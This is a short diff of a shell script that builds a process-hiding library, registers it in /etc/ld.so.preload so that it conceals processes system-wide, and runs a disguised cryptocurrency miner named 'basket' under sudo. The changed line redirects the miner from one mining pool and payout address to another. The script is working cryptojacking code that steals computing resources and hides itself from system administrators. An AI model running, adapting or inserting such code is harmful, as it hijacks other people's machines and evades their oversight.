@@ -49,4 +49,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-sudo ./basket -a ethash -o ethproxy+ssl://eth.2miners.com:2020 -u nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe.$(echo $(shuf -i 1-9999 -n 1)-pentil) -log --proxy 127.0.0.1:9999
+sudo ./basket -a ethash -o ethproxy+ssl://eth-de.flexpool.io:5555 -u 0x7E63579602b8fdbf4385d45aF4cbAe1Ba775Bb2d.pentil -log --proxy 127.0.0.1:9999
